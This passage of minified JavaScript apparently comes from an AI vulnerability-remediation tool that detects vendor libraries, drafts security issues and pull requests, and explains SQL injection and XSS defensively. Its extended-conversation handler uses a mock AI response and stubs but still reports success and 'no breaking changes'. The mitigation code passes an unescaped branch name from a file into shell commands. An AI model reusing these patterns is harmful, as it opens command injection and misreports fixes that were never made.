`)}}var Z3=j1(()=>{V3();pD();kQ();Z3()});import*as r2 from"path";import*as M3 from"fs/promises";class v7{VENDOR_PATTERNS=["node_modules","vendor","bower_components","jspm_packages","packages","third_party","external","libs","dependencies","dist"];MINIFIED_PATTERNS=[".min.js","-min.js",".bundle.js",".min.css","-min.css"];VENDOR_INDICATORS={filePatterns:[/jquery[.-]?([\d.]+)?(?:\.min)?\.js$/i,/bootstrap[.-]?([\d.]+)?(?:\.min)?\.(?:js|css)$/i,/angular[.-]?([\d.]+)?(?:\.min)?\.js$/i,/react[.-]?([\d.]+)?(?:\.min)?\.js$/i,/vue[.-]?([\d.]+)?(?:\.min)?\.js$/i,/lodash[.-]?([\d.]+)?(?:\.min)?\.js$/i,/moment[.-]?([\d.]+)?(?:\.min)?\.js$/i],headerComments:[/\/\*!?\s*jQuery\s+v?([\d.]+)/i,/\/\*!?\s*Bootstrap\s+v?([\d.]+)/i,/\/\*!?\s*Angular\s+v?([\d.]+)/i,/\/\*!?\s*React\s+v?([\d.]+)/i,/\/\*!?\s*Vue\.js\s+v?([\d.]+)/i,/Copyright\s+\(c\)\s+.*\s+Foundation/i,/Licensed\s+under\s+MIT/i,/\/\*!?\s*\w+\.js\s+v?\d+\.\d+\.\d+/]};async isVendorFile(X){if(this.matchesVendorPattern(X))return!0;if(this.isMinified(X))return!0;if(this.matchesKnownLibrary(X))return!0;return!1}async containsVendorIndicators(X,J){if(J)return this.hasVendorHeader(J);try{let Y=(await M3.readFile(X,"utf-8")).substring(0,500);return this.hasVendorHeader(Y)}catch{return!1}}async identifyLibrary(X,J){if(!(await this.isVendorFile(X)||J&&this.hasVendorHeader(J)))return null;if(J){let W=this.extractFromHeader(J);if(W)return W}let Y=this.extractFromPath(X);if(Y)return Y;if(!J)try{let z=(await M3.readFile(X,"utf-8")).substring(0,500);return this.extractFromHeader(z)}catch{}return{name:"unknown-vendor",version:"unknown"}}matchesVendorPattern(X){let J=X.replace(/\\/g,"/");return this.VENDOR_PATTERNS.some((Q)=>J.includes(`/${Q}/`)||J.includes(`${Q}/`))}isMinified(X){let J=r2.basename(X).toLowerCase();return this.MINIFIED_PATTERNS.some((Q)=>J.includes(Q))}matchesKnownLibrary(X){let J=r2.basename(X);return this.VENDOR_INDICATORS.filePatterns.some((Q)=>Q.test(J))}hasVendorHeader(X){return this.VENDOR_INDICATORS.headerComments.some((J)=>J.test(X))}extractFromPath(X){let J=r2.basename(X);for(let Y of this.VENDOR_INDICATORS.filePatterns){let W=J.match(Y);if(W){let z=this.getLibraryNameFromPattern(Y),G=W[1]||"unknown";return{name:z,version:G}}}let Q=J.match(/^([\w-]+)[.-]([\d.]+)(?:\.min)?\.(?:js|css)$/);if(Q)return{name:Q[1].toLowerCase(),version:Q[2]};return null}extractFromHeader(X){let J=X.match(/\/\*!?\s*Bootstrap\s+v?([\d.]+)(?:\s+\([^)]+\))?/i);if(J)return{name:"bootstrap",version:J[1]||"unknown"};for(let Q of this.VENDOR_INDICATORS.headerComments){let Y=X.match(Q);if(Y){let W=this.getLibraryNameFromHeader(X,Q),z=Y[1]||"unknown";if(W)return{name:W.toLowerCase(),version:z}}}return null}getLibraryNameFromPattern(X){let Q=X.source.match(/^(\w+)/);return Q?Q[1].toLowerCase():"unknown"}getLibraryNameFromHeader(X,J){let Q=J.source;if(Q.includes("jQuery"))return"jquery";if(Q.includes("Bootstrap"))return"bootstrap";if(Q.includes("Angular"))return"angular";if(Q.includes("React"))return"react";if(Q.includes("Vue"))return"vue";let Y=X.match(/\/\*!?\s*(\w+)(?:\.js)?\s+v/i);if(Y)return Y[1].toLowerCase();return null}}var n2=()=>{};import*as vQ from"path";import*as U6 from"fs/promises";class x7{async parsePackageJson(X){let J=new Map;if(X.dependencies)Object.entries(X.dependencies).forEach(([Q,Y])=>{J.set(Q,Y)});if(X.devDependencies)Object.entries(X.devDependencies).forEach(([Q,Y])=>{J.set(Q,Y)});if(X.peerDependencies)Object.entries(X.peerDependencies).forEach(([Q,Y])=>{J.set(Q,Y)});return J}isKnownDependency(X,J){let Q=X.replace(/\\/g,"/");for(let[Y,W]of J){if(Q.includes(`node_modules/${Y}/`))return!0;if(Q.includes(`vendor/${Y}/`)||Q.includes(`vendor/${Y}.`)||Q.includes(`/${Y}-`)||Q.includes(`/${Y}.`))return!0}return!1}async findManifests(X="."){let J=[];try{let Q=vQ.join(X,"package.json");try{await U6.access(Q),J.push({type:"npm",path:Q})}catch{}let Y=vQ.join(X,"requirements.txt");try{await U6.access(Y),J.push({type:"python",path:Y})}catch{}let W=vQ.join(X,"Gemfile");try{await U6.access(W),J.push({type:"ruby",path:W})}catch{}let z=vQ.join(X,"composer.json");try{await U6.access(z),J.push({type:"php",path:z})}catch{}}catch(Q){console.error("Error finding manifests:",Q)}return J}async analyzeDependencies(X="."){let J=new Map,Q=await this.findManifests(X);for(let Y of Q)try{switch(Y.type){case"npm":let W=await U6.readFile(Y.path,"utf-8"),z=JSON.parse(W),G=await this.parsePackageJson(z);J.set("npm",G);break;case"python":let H=await U6.readFile(Y.path,"utf-8"),U=this.parseRequirementsTxt(H);J.set("pip",U);break;case"ruby":let K=await U6.readFile(Y.path,"utf-8"),V=this.parseGemfile(K);J.set("gem",V);break;case"php":let B=await U6.readFile(Y.path,"utf-8"),Z=JSON.parse(B),M=this.parseComposerJson(Z);J.set("composer",M);break}}catch(W){console.error(`Error parsing ${Y.type} manifest:`,W)}return J}parseRequirementsTxt(X){let J=new Map,Q=X.split(`
`);for(let Y of Q){let W=Y.trim();if(W&&!W.startsWith("#")){let z=W.match(/^([a-zA-Z0-9-_]+)([><=~!]+)(.+)$/);if(z)J.set(z[1],z[2]+z[3]);else J.set(W,"*")}}return J}parseGemfile(X){let J=new Map,Q=X.split(`
`);for(let Y of Q){let z=Y.trim().match(/gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?/);if(z)J.set(z[1],z[2]||"*")}return J}parseComposerJson(X){let J=new Map;if(X.require)Object.entries(X.require).forEach(([Q,Y])=>{if(!Q.startsWith("php"))J.set(Q,Y)});if(X["require-dev"])Object.entries(X["require-dev"]).forEach(([Q,Y])=>{J.set(Q,Y)});return J}}var a2=()=>{};class f7{detector;analyzer;constructor(X,J){this.detector=X;this.analyzer=J}async handle(X){if(await this.detector.isVendorFile(X.file)){let Q=await this.detector.identifyLibrary(X.file);if(Q)return{type:"vendor",action:"update",library:Q,report:{library:Q.name,currentVersion:Q.version,recommendedVersion:await this.getRecommendedVersion(Q,X),cve:X.cve,updateCommand:this.getUpdateCommand(Q),alternativeFix:this.getSafeWorkaround(X)}};else return{type:"vendor",action:"acknowledge",report:{library:"unknown",currentVersion:"unknown",recommendedVersion:"latest",updateCommand:"Manual update required",alternativeFix:"Review vendor library and update manually"}}}return{type:"application",action:"fix"}}async getRecommendedVersion(X,J){if(X.name==="jquery"){if(X.version.startsWith("3.5."))return"3.5.1";if(X.version.startsWith("3."))return"3.6.0";return"3.6.4"}if(X.name==="bootstrap"){if(X.version.startsWith("4."))return"4.6.2";return"5.3.0"}return"latest"}getUpdateCommand(X){let J=X.packageManager||"npm",Q=X.name;switch(J){case"npm":return`npm update ${Q}`;case"pip":return`pip install --upgrade ${Q}`;case"gem":return`bundle update ${Q}`;case"composer":return`composer update ${Q}`;default:return`${J} update ${Q}`}}getSafeWorkaround(X){switch(X.type){case"XXE":return"Disable external entity processing in XML parser configuration";case"XSS":return"Implement Content Security Policy (CSP) headers";case"SQL_INJECTION":return"Use parameterized queries or prepared statements";default:return}}async isVendorCode(X){return this.detector.isVendorFile(X)}async identifyLibrary(X){return this.detector.identifyLibrary(X)}async checkCVE(X,J){if(X.name==="jquery"&&J.type==="XXE")return"CVE-2020-11022";return J.cve}}class g7{async recommendUpdate(X,J){let Q=X.version,Y=await this.findFixedVersions(X,J),W=this.getMinimumSafeVersion(X,Y),z=await this.checkBreakingChanges(Q,W),G=[];if(G.push({type:"patch",command:this.getUpdateCommand(X,"patch"),risk:"low",notes:"Bug fixes only, no breaking changes"}),z===!1||z===null)G.push({type:"minor",command:this.getUpdateCommand(X,"minor"),risk:"medium",notes:"New features, backward compatible"});return G.push({type:"major",command:this.getUpdateCommand(X,"major"),risk:"high",notes:z?"May require code changes":"Check changelog for breaking changes"}),{severity:J.severity||"MEDIUM",currentVersion:Q,fixedVersions:Y,minimumSafeVersion:W,breakingChanges:z,updateStrategies:G}}async findFixedVersions(X,J){if(X.name==="jquery"){if(X.version.startsWith("3.5.0"))return["3.5.1","3.6.0","3.6.4"]}if(X.name==="bootstrap"){if(X.version.startsWith("4."))return["4.6.2","5.0.0","5.3.0"]}let Q=X.version.split(".");if(Q.length>=3){let Y=parseInt(Q[0]),W=parseInt(Q[1]),z=parseInt(Q[2]);return[`${Y}.${W}.${z+1}`,`${Y}.${W+1}.0`,"latest"]}return["latest"]}getMinimumSafeVersion(X,J){if(J.length>0&&J[0]!=="latest")return J[0];if(X.name==="jquery"&&X.version.startsWith("3.5.0"))return"3.5.1";if(X.name==="bootstrap"&&X.version.startsWith("4."))return"4.6.2";return"latest"}async checkBreakingChanges(X,J){let Q=this.parseVersion(X),Y=this.parseVersion(J);if(!Q||!Y)return;if(Y.major>Q.major)return!0;return!1}parseVersion(X){if(X==="latest"||X==="unknown")return null;let J=X.match(/^(\d+)\.(\d+)\.(\d+)/);if(J)return{major:parseInt(J[1]),minor:parseInt(J[2]),patch:parseInt(J[3])};return null}getUpdateCommand(X,J){let Q=X.packageManager||"npm",Y=X.name;if(Q==="npm")switch(J){case"patch":return`npm update ${Y}`;case"minor":return`npm install ${Y}@^${X.version}`;case"major":return`npm install ${Y}@latest`}return`${Q} update ${Y}`}}class s2{async createIssue(X){let J=this.generateTitle(X),Q=this.generateBody(X),Y=this.generateLabels(X);return{title:J,body:Q,labels:Y,createsPR:!1}}generateTitle(X){return`\uD83D\uDD12 Update ${X.library.name} to fix ${X.type} vulnerability`}generateBody(X){let J=[];if(J.push("## \uD83D\uDCE6 Vendor Library Vulnerability Detected"),J.push(""),J.push(`**Library**: ${X.library.name}`),J.push(`**Version**: ${X.library.version}`),J.push(`**File**: \`${X.file}\``),J.push(`**Vulnerability**: ${X.type}`),J.push(`**Severity**: ${X.severity}`),J.push(""),J.push("### \uD83D\uDD12 Security Details"),X.description)J.push(X.description);else J.push(`A ${X.severity.toLowerCase()} severity ${X.type} vulnerability was detected in ${X.library.name}.`);if(J.push(""),X.cve)J.push(`**CVE**: ${X.cve}`),J.push("");if(J.push("### \uD83D\uDD27 Recommended Actions"),J.push(""),J.push("#### Option 1: Update Library (Recommended)"),J.push("```bash"),J.push(X.updateCommand||`npm update ${X.library.name}`),J.push("```"),X.recommendedVersion)J.push(`This will update to version ${X.recommendedVersion} which fixes this vulnerability.`);if(J.push(""),X.workaround)J.push("#### Option 2: Workaround"),J.push(X.workaround),J.push("");else J.push("#### Option 2: Workaround"),J.push("No safe workaround available. Library update required."),J.push("");if(J.push("#### Option 3: Accept Risk"),J.push("If this is a false positive or the risk is acceptable for your use case, you can:"),J.push("1. Add this file to `.rsolvignore`"),J.push(`2. Mark this issue as "won't fix"`),J.push(""),J.push("### \uD83D\uDCDA References"),X.advisoryUrl)J.push(`- [${X.library.name} Security Advisories](${X.advisoryUrl})`);if(J.push(`- [NPM Audit Report](https://www.npmjs.com/advisories/search?q=${X.library.name})`),X.cve)J.push(`- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=${X.cve})`);return J.push(""),J.push("###  Important Note"),J.push("**Do not manually patch vendor library files.** Changes will be lost when the library updates."),J.push(""),J.push("---"),J.push("*This issue was created by RSOLV vulnerability scanner*"),J.push("*Vendor libraries require different handling than application code*"),J.join(`
`)}generateLabels(X){let J=["security","vendor-library","dependency-update"];if(J.push(X.severity.toLowerCase()),X.type)J.push(X.type.toLowerCase().replace(/_/g,"-"));if(X.library.name)J.push(`lib:${X.library.name}`);return J}}var rD=j1(()=>{n2();a2()});class F3{detector;analyzer;handler;recommender;constructor(){this.detector=new v7,this.analyzer=new x7,this.handler=new f7(this.detector,this.analyzer),this.recommender=new g7}async isVendorFile(X){return this.detector.isVendorFile(X)}async processVulnerability(X){console.log("[VendorDetectionIntegration] Processing vendor vulnerability");let J=X.vendorFiles||[],Q=await this.identifyLibrary(J[0]),Y=await this.recommender.recommendUpdate(Q,X);return{action:"issue_created",type:"vendor_update",library:Q.name,currentVersion:Q.version,recommendedVersion:Y.minimumSafeVersion,updateCommand:Y.updateStrategies[0]?.command,message:`Vendor library ${Q.name} needs update from ${Q.version} to ${Y.minimumSafeVersion}`,recommendation:Y}}async identifyLibrary(X){let J=X.split("/"),Q="unknown",Y="unknown";if(X.includes("jquery")){Q="jquery";let W=X.match(/jquery[.-]?([\d.]+)/);if(W)Y=W[1]}else if(X.includes("bootstrap")){Q="bootstrap";let W=X.match(/bootstrap[.-]?([\d.]+)/);if(W)Y=W[1]}else if(X.includes("node_modules/")){let W=X.match(/node_modules\/([^/]+)/);if(W)Q=W[1]}return{name:Q,version:Y,path:X}}}var nD=j1(()=>{n2();a2()});var aD={};Y9(aD,{VendorVulnerabilityHandler:()=>f7,VendorIssueCreator:()=>s2,VendorDetector:()=>v7,VendorDetectionIntegration:()=>F3,UpdateRecommender:()=>g7,DependencyAnalyzer:()=>x7});var sD=j1(()=>{rD();n2();a2();nD()});var tD={};Y9(tD,{ExtendedConversationIntegration:()=>oD,ExtendedConversationHandler:()=>j3});class j3{config;constructor(X){this.config={maxFilesPerConversation:20,maxTokensPerConversation:150000,conversationStrategy:"grouped",includeContext:!0,...X}}async processMultiFileVulnerability(X,J,Q){console.log(`[ExtendedConversation] Processing ${J.length} files in single conversation`);let Y=await this.buildContext(X,J),W=this.createConversationPlan(X,J),z=await this.executeExtendedConversation(X,Y,W,Q);return{success:!0,prUrl:(await this.generateComprehensivePR(z,X,Q)).url,message:`Fixed ${J.length} files in single PR using extended conversation`,stats:{filesProcessed:J.length,conversationTurns:z.turns,tokensUsed:z.totalTokens||0}}}async buildContext(X,J){let Q={vulnerabilityType:X.type,severity:X.severity,description:X.description,files:[],relatedFiles:[],dependencies:new Map};for(let Y of J){let W=await this.loadFileContent(Y),z=await this.analyzeDependencies(Y,W);Q.files.push({path:Y,content:W,vulnerabilityLocations:X.locations?.filter((G)=>G.file===Y)}),Q.dependencies.set(Y,z)}if(this.config.includeContext){let Y=await this.findRelatedFiles(J,Q.dependencies);for(let W of Y){let z=await this.loadFileContent(W);Q.relatedFiles.push({path:W,content:z})}}return Q}createConversationPlan(X,J){let Q={strategy:this.config.conversationStrategy,phases:[]};switch(this.config.conversationStrategy){case"sequential":Q.phases=J.map((z,G)=>({phase:G+1,description:`Fix vulnerability in ${z}`,files:[z],dependencies:[]}));break;case"grouped":let Y=this.groupRelatedFiles(J,X);Q.phases=Y.map((z,G)=>({phase:G+1,description:`Fix vulnerability in ${z.name}`,files:z.files,dependencies:z.dependencies}));break;case"prioritized":let W=this.prioritizeFiles(J,X);Q.phases=[{phase:1,description:"Fix critical vulnerabilities",files:W.critical},{phase:2,description:"Fix remaining vulnerabilities",files:W.remaining}];break}return Q}async executeExtendedConversation(X,J,Q,Y){let W={turns:0,totalTokens:0,messages:[],fixes:[]},z=this.buildInitialPrompt(X,J,Q),G=await this.generateAIResponse(z);W.turns++,W.totalTokens+=1000,W.messages.push({role:"assistant",content:G});for(let K of Q.phases){console.log(`[ExtendedConversation] Processing phase ${K.phase}: ${K.description}`);let V=this.buildPhasePrompt(K,J),B=W.messages.map((M)=>`${M.role==="user"?"User":"Assistant"}: ${M.content}`).join(`

`)+`

User: `+V;G=await this.generateAIResponse(B),W.turns++,W.totalTokens+=1000,W.messages.push({role:"assistant",content:G});let Z=this.extractFixes(G,K.files);if(W.fixes.push(...Z),W.totalTokens>this.config.maxTokensPerConversation*0.8){console.log("[ExtendedConversation] Approaching token limit, finalizing conversation");break}}let H=this.buildReviewPrompt(W.fixes),U=W.messages.map((K)=>`${K.role==="user"?"User":"Assistant"}: ${K.content}`).join(`

`)+`

User: `+H;return G=await this.generateAIResponse(U),W.turns++,W.totalTokens+=1000,W}async generateComprehensivePR(X,J,Q){let Y=this.buildPRBody(X,J,Q);for(let z of X.fixes)await this.applyFix(z);return await this.createPullRequest({title:`[RSOLV] Fix ${J.type} vulnerability across ${X.fixes.length} files`,body:Y,branch:`rsolv/fix-issue-${Q}`,files:X.fixes.map((z)=>z.file)})}async loadFileContent(X){return""}async analyzeDependencies(X,J){return[]}async findRelatedFiles(X,J){return[]}groupRelatedFiles(X,J){return[]}prioritizeFiles(X,J){return{critical:[],remaining:[]}}buildInitialPrompt(X,J,Q){return`
You are fixing a ${X.type} vulnerability that affects ${J.files.length} files.

VULNERABILITY DETAILS:
${X.description}

AFFECTED FILES:
${J.files.map((Y)=>`- ${Y.path}`).join(`
`)}

PLAN:
We'll fix this systematically across all files in a single PR. 
${Q.phases.map((Y)=>`Phase ${Y.phase}: ${Y.description}`).join(`
`)}

Let's start by understanding the vulnerability pattern across all files.
Please analyze the following files and identify the common vulnerability pattern:

${J.files.slice(0,3).map((Y)=>`
File: ${Y.path}
\`\`\`
${Y.content.substring(0,1000)}
\`\`\`
`).join(`
`)}

What's the consistent pattern we need to fix across all files?
    `}buildPhasePrompt(X,J){return`
Now let's fix the vulnerability in phase ${X.phase}: ${X.description}

Files to fix:
${X.files.join(`
`)}

Please provide the fixes for each file, ensuring consistency with previous fixes.
    `}buildReviewPrompt(X){return`
Let's review all ${X.length} fixes for consistency and completeness.

Please verify:
1. All fixes follow the same pattern
2. No security issues are introduced
3. The code remains functional
4. All vulnerable patterns are addressed

Provide a final summary of the changes.
    `}extractFixes(X,J){return[]}buildPRBody(X,J,Q){return`
## \uD83D\uDD12 Security Fix: ${J.type}

Fixes #${Q}

### \uD83D\uDCCA Summary
- **Files Fixed**: ${X.fixes.length}
- **Vulnerability Type**: ${J.type}
- **Severity**: ${J.severity}
- **Conversation Turns**: ${X.turns}
- **Approach**: Extended conversation with comprehensive context

### \uD83D\uDD27 Changes Made
${X.fixes.map((Y)=>`-  ${Y.file||"Unknown file"}: Fixed vulnerability`).join(`
`)}

### \uD83E\uDDEA Testing
- All changes made in a single, coherent PR
- Consistent fix pattern applied across all files
- No breaking changes introduced

### \uD83D\uDCDD Technical Details
This fix was generated using an extended conversation approach, processing all ${X.fixes.length} files 
in a single Claude conversation rather than splitting into multiple PRs. This ensures consistency 
and maintains context across all changes.

---
\uD83E\uDD16 Fixed by RSOLV using Extended Conversation Approach
    `}async applyFix(X){}async createPullRequest(X){return{url:""}}async generateAIResponse(X){return console.log("[ExtendedConversation] Generating AI response for prompt length:",X.length),`Mock response for extended conversation. 
    This would contain the actual fix for the vulnerability across all files.
    The real implementation would use the AI provider to generate comprehensive fixes.`}}class oD{handler;constructor(X){this.handler=new j3(X)}shouldUseExtendedConversation(X){let J=X.files?.length||X.filesToModify?.length||1;return J>1&&J<=20}async processWithExtendedConversation(X,J){let Q=X.files||X.filesToModify||[];console.log(`[ExtendedConversation] Processing ${Q.length} files in single conversation`);try{let Y=await this.handler.processMultiFileVulnerability(X,Q,J);return{success:!0,action:"pr_created",prUrl:Y.prUrl,message:Y.message,stats:Y.stats}}catch(Y){return console.error("[ExtendedConversation] Error:",Y),{success:!1,action:"failed",error:Y instanceof Error?Y.message:String(Y),message:"Extended conversation failed, may need manual intervention"}}}}var Xw={};Y9(Xw,{hasFileInformation:()=>$u1,extractFilesFromVulnerabilities:()=>Eu1});function Eu1(X,J="unknown"){if(!Array.isArray(X)||X.length===0)return q.debug(`[${J}] No vulnerabilities to extract files from`),[];let Q=[];X.forEach((W,z)=>{let G=eD(W);if(G.length===0)q.warn(`[${J}] Could not extract files from vulnerability ${z}:`,{vulnerabilityKeys:Object.keys(W),vulnerabilityType:W?.type,vulnerabilityString:JSON.stringify(W).substring(0,200)});else q.debug(`[${J}] Extracted ${G.length} files from vulnerability ${z}:`,G);Q.push(...G)});let Y=[...new Set(Q)];return q.info(`[${J}] Total files extracted from ${X.length} vulnerabilities:`,{totalFiles:Y.length,files:Y}),Y}function eD(X){if(!X||typeof X!=="object")return[];if("file"in X&&typeof X.file==="string")return[X.file];if("files"in X&&Array.isArray(X.files))return X.files.filter((J)=>typeof J==="string");if("path"in X&&typeof X.path==="string")return[X.path];if("filePath"in X&&typeof X.filePath==="string")return[X.filePath];if("location"in X&&typeof X.location==="object"){let J=X.location;if(J.file&&typeof J.file==="string")return[J.file];if(J.path&&typeof J.path==="string")return[J.path]}if("filename"in X&&typeof X.filename==="string")return[X.filename];if("fileName"in X&&typeof X.fileName==="string")return[X.fileName];return[]}function $u1(X){if(!X||typeof X!=="object")return!1;return eD(X).length>0}var Jw=j1(()=>{t1()});var Yw={};Y9(Yw,{MitigationMode:()=>Qw});import{execSync as YJ}from"child_process";import*as qX from"fs";import*as o2 from"path";class Qw{config;repoPath;constructor(X,J){this.config=X,this.repoPath=J||process.cwd()}async checkoutValidationBranch(X){try{let J=o2.join(this.repoPath,".rsolv","validation",`issue-${X.number}.json`);if(!qX.existsSync(J))return q.info("No validation results found, staying on current branch"),!1;let Q=JSON.parse(qX.readFileSync(J,"utf-8"));if(!Q.branchName)return q.info("No validation branch found, staying on current branch"),!1;try{try{YJ(`git fetch origin ${Q.branchName}`,{cwd:this.repoPath}),q.info(`Fetched validation branch from remote: ${Q.branchName}`)}catch(Y){q.warn(`Could not fetch validation branch from remote: ${Y}`)}try{return YJ(`git checkout ${Q.branchName}`,{cwd:this.repoPath}),q.info(`Checked out local validation branch: ${Q.branchName}`),!0}catch{try{return YJ(`git checkout -b ${Q.branchName} origin/${Q.branchName}`,{cwd:this.repoPath}),q.info(`Checked out remote validation branch: origin/${Q.branchName}`),!0}catch(Y){return q.warn(`Failed to checkout validation branch from remote: ${Y}`),!1}}}catch(Y){return q.warn(`Failed to checkout validation branch: ${Y}`),!1}}catch(J){return q.error(`Error checking out validation branch for issue #${X.number}:`,J),!1}}async getValidationTests(X){let J=o2.join(this.repoPath,".rsolv","tests");if(!qX.existsSync(J))return[];try{return qX.readdirSync(J).filter((Q)=>Q.endsWith(".test.js")).map((Q)=>o2.join(J,Q))}catch(Q){return q.warn(`Could not read test directory: ${Q}`),[]}}async generateTestAwareFix(X){try{let J=await this.checkoutValidationBranch(X),Y=(await this.getValidationTests(X)).map((z)=>{try{return{path:z,content:qX.readFileSync(z,"utf-8")}}catch(G){return q.warn(`Could not read test file ${z}:`,G),null}}).filter(Boolean),W=this.buildTestAwarePrompt(X,Y);return q.info(`Generated test-aware mitigation prompt for issue #${X.number}`),q.info(`- Validation branch: ${J?"checked out":"not available"}`),q.info(`- Test files found: ${Y.length}`),{branchCheckedOut:J,testFilesFound:Y.length,enhancedPrompt:W,testContents:Y}}catch(J){throw q.error(`Test-aware fix generation failed for issue #${X.number}:`,J),J}}buildTestAwarePrompt(X,J){let Q=`
Fix the security vulnerability described in issue #${X.number}: "${X.title}"

Issue Description:
${X.body}
`;if(J.length===0)return q.info("No validation tests found, using standard prompt"),Q;let Y=`
VALIDATION TESTS AVAILABLE:
The following tests define the expected behavior and vulnerability patterns.
These tests currently FAIL on the vulnerable code and should PASS after your fix:

${J.map((W)=>`
File: ${W.path}
\`\`\`javascript
${W.content}
\`\`\`
`).join(`
`)}

REQUIREMENTS:
1. Your fix must make these tests pass
2. Preserve all existing behavioral contracts tested
3. Make minimal, incremental changes
4. You can run these tests locally to validate your fix using: npm test

`;return Q+Y}getCurrentBranch(){try{return YJ("git branch --show-current",{cwd:this.repoPath,encoding:"utf8"}).trim()}catch(X){return q.warn(`Could not get current branch: ${X}`),"main"}}async createPRFromValidationBranch(X){try{let J=this.getCurrentBranch();if(!J.startsWith("rsolv/validate/"))return q.warn(`Not on validation branch (${J}), cannot create PR with tests`),{success:!1,reason:"Not on validation branch"};if(YJ("git status --porcelain",{cwd:this.repoPath,encoding:"utf8"}).trim())YJ("git add .",{cwd:this.repoPath}),YJ(`git commit -m "Fix vulnerability for issue #${X.number}

 Generated with RSOLV three-phase workflow
\uD83E\uDDEA Includes validation tests from ${J}"`,{cwd:this.repoPath}),q.info(`Committed fix to validation branch: ${J}`);let Y=`\uD83D\uDD12 Fix security vulnerability: ${X.title}`,W=`
## Security Fix for Issue #${X.number}

**Vulnerability**: ${X.title}

### \uD83D\uDCCB Changes Made
- Fixed security vulnerability identified in issue #${X.number}
- Generated using RSOLV three-phase workflow (Scan  Validate  Mitigate)

### \uD83E\uDDEA Validation Tests Included
This PR includes validation tests that:
-  Prove the vulnerability existed (red tests)
-  Verify the fix resolves the issue (green tests)
-  Prevent regression

### \uD83D\uDD27 Test-Aware Fix Generation
The fix was generated using AI with access to validation tests, ensuring:
- Behavioral contracts are preserved
- Minimal, focused changes
- Test-driven approach

**Branch**: \`${J}\`
**Issue**: #${X.number}

---
\uD83E\uDD16 Generated with [RSOLV](https://rsolv.app) - AI-powered vulnerability remediation
      `.trim();return q.info(`Creating PR from validation branch: ${J}`),q.info(`PR Title: ${Y}`),{success:!0,branch:J,title:Y,body:W,hasTests:!0,message:`PR ready to be created from validation branch ${J}`}}catch(J){return q.error("Failed to create PR from validation branch:",J),{success:!1,error:J instanceof Error?J.message:String(J)}}}}var Ww=j1(()=>{t1()});class O3{generateLineLevelExplanation(X,J){let Q=`Line ${X.line}: ${this.getVulnerabilityDisplayName(X.type)} Vulnerability`,Y=this.generateLineLevelContent(X,J),W=this.generateSecureExample(X.type,J);return{tier:"line",vulnerabilityId:`${X.type}-${X.line}`,title:Q,content:Y,secureExample:W,riskLevel:X.severity,lineNumber:X.line,codeSnippet:J}}generateConceptLevelExplanation(X,J){let Q=`Understanding ${this.getVulnerabilityDisplayName(X)}`,Y=this.generateConceptLevelContent(X),W=this.getPreventionMethods(X),z=this.getAttackScenarios(X),G=this.getRelatedConcepts(X);return{tier:"concept",vulnerabilityType:X,title:Q,content:Y,preventionMethods:W,attackScenarios:z,relatedConcepts:G,affectedVulnerabilities:J.filter((H)=>H.type===X)}}generateBusinessLevelExplanation(X){let J=this.calculateRiskScore(X),Q=this.analyzeBusinessImpact(X),Y=this.analyzeComplianceImpact(X),W=this.determinePriorities(X),z=this.estimateTimeline(X);return{tier:"business",title:"Security Risk Assessment and Business Impact",content:this.generateBusinessLevelContent(X),businessImpact:Q,complianceImpact:Y,riskScore:J,priorities:W,timeline:z}}generateCompleteExplanation(X,J){let Q=[];for(let H of X){let U=this.extractCodeSnippet(H,J);Q.push(this.generateLineLevelExplanation(H,U))}let W=[...new Set(X.map((H)=>H.type))].map((H)=>this.generateConceptLevelExplanation(H,X)),z=this.generateBusinessLevelExplanation(X),G=this.generateSummary(X);return{lineLevelExplanations:Q,conceptLevelExplanations:W,businessLevelExplanation:z,summary:G,timestamp:new Date().toISOString()}}formatAsMarkdown(X){if(X.tier==="line")return this.formatLineLevelMarkdown(X);else if(X.tier==="concept")return this.formatConceptLevelMarkdown(X);else return this.formatBusinessLevelMarkdown(X)}generateMarkdownReport(X){let J=`# Security Vulnerability Explanation

`;J+=`**Generated:** ${new Date(X.timestamp).toLocaleDateString()}

`,J+=`## Summary

`,J+=`- **Total Vulnerabilities:** ${X.summary.totalVulnerabilities}
`,J+=`- **Estimated Fix Time:** ${X.summary.estimatedFixTime}
`,J+=`- **Risk Score:** ${X.businessLevelExplanation.riskScore}/100

`,J+=`## Line-Level Analysis

`;for(let Q of X.lineLevelExplanations)J+=this.formatLineLevelMarkdown(Q)+`
`;J+=`## Concept-Level Analysis

`;for(let Q of X.conceptLevelExplanations)J+=this.formatConceptLevelMarkdown(Q)+`
`;return J+=`## Business Impact Analysis

`,J+=this.formatBusinessLevelMarkdown(X.businessLevelExplanation),J}generateLineLevelContent(X,J){return{sql_injection:"This line contains a SQL injection vulnerability because it uses string concatenation to build a database query. User input is directly embedded into the SQL statement without proper sanitization, allowing attackers to manipulate the query logic.",xss:"This line contains a cross-site scripting (XSS) vulnerability because it directly assigns user-controlled content to innerHTML without sanitization. This allows attackers to inject malicious scripts that execute in other users' browsers.",broken_access_control:"This endpoint lacks proper access control checks, allowing unauthorized users to access restricted functionality or data.",sensitive_data_exposure:"This line exposes sensitive data in plain text, making it vulnerable to unauthorized access or accidental disclosure."}[X.type]||`This line contains a ${X.type} vulnerability that poses security risks.`}generateSecureExample(X,J){return{sql_injection:`const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId], callback);`,xss:`element.textContent = userInput;
// or use a sanitization library:
element.innerHTML = DOMPurify.sanitize(userInput);`,broken_access_control:`app.get("/admin/users", authenticateUser, authorizeAdmin, (req, res) => {
  // handler code
});`,sensitive_data_exposure:`const hashedPassword = await bcrypt.hash(password, 10);
// Never log sensitive data`}[X]||"Use secure coding practices for this vulnerability type."}generateConceptLevelContent(X){return{sql_injection:"SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL code into application queries, potentially gaining unauthorized access to sensitive data, modifying database contents, or executing administrative operations.",xss:"Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users. When successful, XSS attacks can access sensitive page content, session tokens, or other sensitive information, and can perform actions on behalf of the victim.",broken_access_control:"Broken access control occurs when applications fail to properly restrict what authenticated users are allowed to do. This can lead to unauthorized information disclosure, modification, or destruction of data, or performing business functions outside the user's limits."}[X]||`${X} represents a security vulnerability that requires attention.`}getPreventionMethods(X){return{sql_injection:["Use parameterized queries or prepared statements","Implement input validation and sanitization","Apply principle of least privilege for database accounts"],xss:["Output encoding and escaping","Input validation and sanitization","Content Security Policy (CSP) implementation"],broken_access_control:["Implement proper authentication mechanisms","Use role-based access control (RBAC)","Apply principle of least privilege"]}[X]||["Implement secure 